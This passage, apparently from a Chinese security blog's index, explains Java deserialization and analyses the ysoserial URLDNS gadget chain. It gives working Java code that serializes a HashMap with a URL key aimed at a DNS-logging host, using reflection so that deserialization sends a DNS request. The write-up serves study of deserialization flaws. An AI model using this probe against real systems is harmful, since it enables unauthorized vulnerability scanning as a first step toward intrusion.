Chain，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。","text":"初次接触java反序列化漏洞，通过分析ysoserial工具中的Gadget Chain，来学习java反序列化漏洞。本文先从最简单的URLDNS Gadget chain开始java反序列化篇章。 java原生反序列化JDK类库中的序列化API java.io.ObjectOutputStream代表对象输出流，它的writeObject(Object obj)方法可对参数指定的obj对象进行序列化，把得到的字节序列写到一个目标输出流中。 java.io.ObjectInputStream代表对象输入流，它的readObject()方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回。 只有实现了Serializable和Externalizable接口的类的对象才能被序列化。Externalizable接口继承自 Serializable接口，实现Externalizable接口的类完全由自身来控制序列化的行为，而仅实现Serializable接口的类可以 采用默认的序列化方式 。 对象序列化包括如下步骤： 创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流； 通过对象输出流的writeObject()方法写对象。 对象反序列化的步骤如下： 创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流； 通过对象输入流的readObject()方法读取对象。 例： 定义一个Student类，实现Serializable接口 123456789101112131415161718192021222324252627282930313233343536373839404142import java.io.Serializable;public class Student implements Serializable &#123; private int age; private String name; private String sex; public Student()&#123; &#125; public Student(String name,int age,String sex)&#123; this.age = age; this.name = name; this.sex = sex; &#125; public int getAge() &#123; return age; &#125; public String getName() &#123; return name; &#125; public String getSex() &#123; return sex; &#125; public void setAge(int age) &#123; this.age = age; &#125; public void setName(String name) &#123; this.name = name; &#125; public void setSex(String sex) &#123; this.sex = sex; &#125;&#125; 序列化和反序列化Student类对象 123456789101112131415161718192021222324252627282930313233343536373839import java.io.File;import java.io.FileInputStream;import java.io.FileNotFoundException;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectInputStream;import java.io.ObjectOutputStream;import java.text.MessageFormat;public class SerializeAndDeserialize &#123; public static void main(String[] args) throws Exception &#123; SerializeStudent();//序列化Student对象 Student s = DeserializeStudent();//反序列Student对象 System.out.println(MessageFormat.format(&quot;name=&#123;0&#125;,age=&#123;1&#125;,sex=&#123;2&#125;&quot;, s.getName(), s.getAge(), s.getSex())); &#125; private static void SerializeStudent() throws FileNotFoundException,IOException &#123; Student student = new Student(&quot;zhangsan&quot;,18,&quot;男&quot;); // ObjectOutputStream 对象输出流，将Student对象存储为Student.txt文件中，完成对Student对象的序列化操作 ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;Student.txt&quot;))); oo.writeObject(student); System.out.println(&quot;Student对象序列化成功！&quot;); oo.close(); &#125; private static Student DeserializeStudent() throws Exception, IOException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream( new File(&quot;Student.txt&quot;))); Student student = (Student) ois.readObject(); System.out.println(&quot;Student对象反序列化成功！&quot;); return student; &#125;&#125; 代码运行结果如下： 反序列化漏洞形成的必要条件漏洞的形成需要找到如下三个条件相关的类，并且都得实现了Serializable接口。 执行类(风险方法类) sink 调用链 gadget chain 入口类 source 1、执行类 存在风险方法，并且传递参数可控 比如： 反射调用参数可控(RCE、SSRF) Runtime类的相关方法(RCE) URL类的相关方法(SSRF) …… 2、调用链 调用链就是将执行类的风险方法与入口类的readObject方法中调用的方法关联或者说联系在一起的一个或多个类的方法，与执行类的风险方法相连接的链，必须是同类型或者说类型宽泛，方法名相同与否都可以，但是方法内必须调用与执行类的风险方法同名，以此类推直至找到与入口类的readObject方法中调用的方法同名的方法，调用链才算完成。 这个解释看不懂没关系，后面在如何寻找gadget chain中会作详细解释。 3、入口类 入口类首先得重写readObject方法，类型越宽泛越好 。例如：HashMap 如何寻找gadget chain这里结合流程图对寻找gadget chain作详细解释，以第一个链为例，后面的链都是一个道理。 假设这里有一个命令执行风险类A,其中的a方法存在命令执行风险(这里不探究具体代码,只是理解调用链的链接方式) 现在我们要找它的第一个链，现在有三个选择 同类不同名方法调用了a() 不同类同名方法调用了a() 不同类不同名方法调用了a() 当我们选择同类不同名方法调用了a()时，需要考虑的是参数ghi是否可控。 当我们选择不同类同名方法调用了a()时，需要考虑的是Abc与Ghi是否是同类型，x2可否控制或者说可不可以通过其他方式控制。 当我们选择不同类不同名方法调用了a()，需要考虑的是Def与Ghi是否是同类型，x1可否控制或者说可不可以通过其他方式控制。 往后的链都是一个道理，直至找到与入口类的readObject方法中，调用的方法同名的方法。 比如：HashMap.readObject()中调用了hash()，那么我们的链找到hash()方法就可以，当然具体能不能用还是要看参数是否可控。 URLDNS Gadget Chain12345ysoserial Gadget Chain: HashMap.readObject()//入口类 HashMap.putVal() HashMap.hash() URL.hashCode() //执行类 从ysoserial工具的payload来看，执行类是URL的hashCode方法，那我们就跟进去URL类去看看。 URL类 123456789 private int hashCode = -1; public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125; hashCode默认等于-1，那么就会调用handler.hashCode(this); 跟进到handler.hashCode(); 调用handler.hashCode();传入一个URL对象，会调用getHostAddress方法，根据注释Get the IP address of our host.获取主机ip地址，会向host发送请求。 123456789101112131415161718192021222324252627/** * Get the IP address of our host. An empty host field or a DNS failure * will result in a null return. * * @param u a URL object * @return an &#123;@code InetAddress&#125; representing the host * IP address. * @since 1.3 */ protected synchronized InetAddress getHostAddress(URL u) &#123; if (u.hostAddress != null) return u.hostAddress; String host = u.getHost(); if (host == null || host.equals(&quot;&quot;)) &#123; return null; &#125; else &#123; try &#123; u.hostAddress = InetAddress.getByName(host); &#125; catch (UnknownHostException ex) &#123; return null; &#125; catch (SecurityException se) &#123; return null; &#125; &#125; return u.hostAddress; &#125; 好的，现在执行类已经有了，URL.hashCode()。下面开始找调用链，直接搜索hashCode。 嗯。漂亮，1291处这里就不一个一个看了，我们就直接来看payload的Gadget Chain。HashMap.hash() 这里不就是上面所说的，不同类不同名方法调用了hashCode()，我们只需要看是否是同类型，参数是否可控。这里一个类型Object，一个URL，万物皆Object，符合。但是key并不清楚能否控制，接着往下找。 接下来找那些类调用了hash()，不多，有24处，可以稍微看一下。 直接找到了入口类 HashMap.readObject()， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152/** * Reconstitutes this map from a stream (that is, deserializes it). * @param s the stream * @throws ClassNotFoundException if the class of a serialized object * could not be found * @throws IOException if an I/O error occurs */private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it&#x27;s the nearest public type to // what we&#x27;re actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false);//调用hash(key) &#125; &#125;&#125; 在最后的for循环中调用了hash()，传递了参数key，而key就是将集合的泛型K反序列化后的对象，HashMap的泛型K,V都是可以控制。那么我们来捋一下Gadget Chain。 12345678910111213141516Gadget Chain： HashMap.readObject()&#123; hash(key) &#125; HashMap.hash(Object,key)&#123; key.hashCode() &#125; URL.hashCode()&#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode; &#125; hashCode(URL u) &#123; getHostAddress(u); &#125; ysoserial工具的payload中多走了一步HashMap.putVal()，从Gadget Chain中可以看出我们只需要将HashMap.hash(Object,key)方法中的key传递一个URL对象，就会调用URL.hashCode()，hashCode=-1就会调用handler.hashCode(this)，就顺利调用getHostAddress(u)。 那么我们便可以构造代码验证一下 序列化HashMap对象 1234567891011121314151617import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.net.URL;import java.util.HashMap;public class Serialize &#123; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException&#123; URL url = new URL(&quot;http://7d144017.dns.1433.eu.org&quot;); HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;&gt;(); //HashMap&lt;K, V&gt;,K为URL对象，V随意 hashmap.put(url,1); ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;HashMap.txt&quot;))); oo.writeObject(hashmap); &#125;&#125; 反序列化HashMap对象 1234567891011import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.io.ObjectInputStream;public class UnSerialize &#123; public static void main(String[] args) throws IOException, ClassNotFoundException &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(new File(&quot;HashMap.txt&quot;))); ois.readObject(); &#125;&#125; 这时出现了问题，在序列化的时候接收到了请求但是反序列化确没有接收到请求。 经过调试发现，序列化时会发生请求是因为put方法里面也调用了hash()，触发了URL.hashCode，而反序列化时不会发生请求是因为调用到URL.hashCode时，hashCode的值不等于-1，所以进入不到，handler.hashCode(this)，那我们只需要想办法当它序列化时值改为不等于-1的值，调用完put后把他的值改成-1就可以，那要怎么才能改变hashCode的值呢，这里就需要用到Java反射。 改进后的 1234567891011121314151617181920212223242526import java.io.File;import java.io.FileOutputStream;import java.io.IOException;import java.io.ObjectOutputStream;import java.lang.reflect.Field;import java.net.URL;import java.util.HashMap;public class Serialize &#123; public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException &#123; URL url = new URL(&quot;http://e5e3bb79.dns.1433.eu.org&quot;); HashMap&lt;URL, Integer&gt; hashmap = new HashMap&lt;&gt;(); //HashMap&lt;K, V&gt;,K为URL对象，V随意 Class c = url.getClass(); Field hashCode = c.getDeclaredField(&quot;hashCode&quot;); hashCode.setAccessible(true); hashCode.set(url,-2);//在put前将hashCode的值设置为-2 hashmap.put(url,1); hashCode.set(url,-1);//之后再设置回-1 ObjectOutputStream oo = new ObjectOutputStream(new FileOutputStream(new File(&quot;HashMap.txt&quot;))); oo.writeObject(hashmap); &#125;&#125; 再次尝试，序列化时没有发送请求。 反序列化发送了请求 至此URLDNS分析完毕。","categories":[],"tags":[{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"}]}],"categories":[],"tags":[{"name":"java安全","slug":"java安全","permalink":"https://self209.github.io/tags/java%E5%AE%89%E5%85%A8/"},{"name":"反序列化","slug":"反序列化","permalink":"https://self209.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]}